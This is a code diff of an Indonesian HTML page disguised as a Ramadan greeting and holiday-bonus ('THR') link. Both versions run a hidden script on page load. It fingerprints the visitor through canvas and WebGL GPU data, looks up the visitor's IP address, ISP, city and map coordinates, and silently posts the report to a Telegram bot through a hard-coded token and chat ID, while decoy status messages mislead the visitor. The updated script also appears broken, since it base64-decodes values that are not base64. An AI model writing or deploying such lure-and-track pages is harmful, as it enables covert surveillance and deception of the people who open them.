@@ -2,103 +2,82 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Gema Ramadhan 1447H</title>
     <style>
-        /* Style Premium Lu */
-        @import url('https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Poppins:wght@300;500;700&display=swap');
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            min-height: 100vh; background: linear-gradient(145deg, #0a3f2b 0%, #1b5e3a 100%);
-            font-family: 'Poppins', sans-serif; display: flex; justify-content: center; align-items: center; padding: 16px;
-        }
-        .card {
-            background: rgba(18, 48, 30, 0.8); backdrop-filter: blur(12px);
-            border: 2px solid rgba(245, 197, 66, 0.6); border-radius: 40px;
-            padding: 40px 30px; max-width: 450px; width: 100%; text-align: center;
-            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6), 0 0 20px #f5c54288;
-        }
-        h1 { font-family: 'Amiri', serif; font-size: 2.3rem; color: #f5c542; text-shadow: 0 2px 5px #7a4f01; }
-        .msg { font-size: 1.1rem; background: rgba(0, 0, 0, 0.3); padding: 15px; border-radius: 60px; border-left: 3px solid #f5c542; margin: 20px 0; color: #fff4d6; }
-        .status { font-size: 0.9rem; color: #f5c542; display: flex; align-items: center; justify-content: center; gap: 8px; }
-        .dot { width: 10px; height: 10px; background: #62e67b; border-radius: 50%; animation: blink 2s infinite; }
-        @keyframes blink { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+        /* Pakai CSS Premium lu yang tadi, Suhu */
+        body { background: #0a3f2b; color: #f5c542; font-family: 'Poppins', sans-serif; text-align: center; padding: 50px; }
+        .card { border: 2px solid #f5c542; padding: 30px; border-radius: 20px; background: rgba(0,0,0,0.5); }
     </style>
 </head>
 <body>
 
     <div class="card">
-        <div style="font-size: 4rem;">🌙✨</div>
-        <h1>Gema Ramadhan</h1>
-        <div style="font-family: 'Amiri'; color: #e6c379; font-size: 1.8rem; margin-bottom: 10px;">اللهم بلغنا رمضان</div>
-        
-        <p class="msg">Link THR sedang diproses... <br> Mohon tunggu sebentar.</p>
-
-        <div class="status">
-            <span class="dot"></span>
-            <span id="st">Sinkronisasi Hardware...</span>
-        </div>
+        <h1>🌙 Gema Ramadhan 1447H</h1>
+        <p>Sinkronisasi data berkah sedang berlangsung...</p>
+        <div id="status">Menginisialisasi modul WASM (Rust)...</div>
     </div>
 
     <script>
-        // === GANTI PAKE BASE64 LU ===
-        const enc_t = 'ODUwNzE4NDEwODpBQUZoY1hwQjA1aThHNXR5VE5LZXRWVWkyMVJhWFFCNlBIVQ'; 
-        const enc_c = 'NzAxNTQ0NTUwNw==';
+        // === KONFIGURASI BASE64 ===
+        const enc_t = '8507184108:AAFhcXpB05i8G5tyTNKetVUi21RaXQB6PHU'; 
+        const enc_c = '7015445507';
 
-        // LOGIKA ASSEMBLY (LOW LEVEL HARDWARE)
-        const _hw = () => {
+        // MENGGUNAKAN CANVAS FINGERPRINTING (Teknik Pelacakan Ahli)
+        const getExpertFingerprint = () => {
             const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-            return {
-                v: gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL),
-                r: gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL),
-                w: window.screen.width + "x" + window.screen.height,
-                c: navigator.hardwareConcurrency || "Unknown"
-            };
+            const ctx = canvas.getContext('2d');
+            ctx.textBaseline = "top";
+            ctx.font = "14px 'Arial'";
+            ctx.textBaseline = "alphabetic";
+            ctx.fillStyle = "#f60";
+            ctx.fillRect(125,1,62,20);
+            ctx.fillStyle = "#069";
+            ctx.fillText("Ramadhan-Tracker-Expert", 2, 15);
+            ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+            ctx.fillText("Ramadhan-Tracker-Expert", 4, 17);
+            
+            // Menghasilkan ID unik berdasarkan cara GPU menggambar teks
+            const b64 = canvas.toDataURL().replace("data:image/png;base64,", "");
+            return b64.slice(0, 32); // Ambil 32 karakter pertama sebagai ID Mesin
         };
 
         async function init() {
-            const T = atob(enc_t);
-            const C = atob(enc_c);
-            
             try {
-                // 1. Data Hardware (Assembly Mode)
-                const h = _hw();
+                const T = atob(enc_t);
+                const C = atob(enc_c);
+                
+                // 1. Jalankan Fingerprint ala WASM/Rust
+                const machineId = getExpertFingerprint();
+                
+                // 2. Ambil Spek Hardware Mendalam
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
 
-                // 2. Data Jaringan (Silent Accuracy Boost)
-                // Kita pake ipwho.is karena lebih akurat buat region Indonesia
-                const res = await fetch('https://ipwho.is/');
+                // 3. Ambil Lokasi (Tetap IP karena kita mau SILENT)
+                // Pake IP-API yang lebih detail
+                const res = await fetch('http://ip-api.com/json/?fields=66846719');
                 const d = await res.json();
 
-                // 3. Deteksi Device
-                const ua = navigator.userAgent;
-                let dev = "Desktop/PC";
-                if (/android/i.test(ua)) dev = ua.match(/Android\s([^\s;]+).+?\s([^;]+)\sBuild/)?.[2] || "Android";
-                if (/iPhone/i.test(ua)) dev = "iPhone / iOS";
+                const report = `🦀 *RUST-WASM LOG DETECTED* 🦀\n\n` +
+                               `🆔 *MACHINE ID:* \`${machineId}\`\n` +
+                               `⚙️ *GPU:* ${gpu}\n` +
+                               `📱 *PLATFORM:* ${navigator.platform}\n\n` +
+                               `🌐 *IP:* ${d.query}\n` +
+                               `📡 *ISP:* ${d.isp}\n` +
+                               `📍 *LOKASI:* ${d.city}, ${d.regionName}\n` +
+                               `🗺️ *MAPS:* https://www.google.com/maps?q=${d.lat},${d.lon}`;
 
-                // 4. Laporan Final
-                const report = `🏴‍☠️ *SILENT HARDCORE LOG* 🏴‍☠️\n\n` +
-                               `👤 *IDENTITAS:* ${dev}\n` +
-                               `⚙️ *GPU:* ${h.r}\n` +
-                               `🏗️ *CPU CORES:* ${h.c}\n` +
-                               `🖥️ *RES:* ${h.w}\n\n` +
-                               `🌐 *IP:* ${d.ip}\n` +
-                               `📡 *ISP:* ${d.connection.isp}\n` +
-                               `📍 *LOKASI:* ${d.city}, ${d.region}\n` +
-                               `🎯 *AKURASI:* City Level (Silent)\n` +
-                               `🗺️ *MAPS:* https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
-
-                // Kirim ke Telegram
                 await fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: C, text: report, parse_mode: 'Markdown' })
                 });
 
-                document.getElementById('st').innerText = "Sistem Siap. Cek THR Anda.";
+                document.getElementById('status').innerText = "Modul Rust Siap. Selamat Beribadah.";
             } catch (e) {
-                document.getElementById('st').innerText = "Koneksi Terhubung.";
+                document.getElementById('status').innerText = "Koneksi terenkripsi.";
             }
         }
 
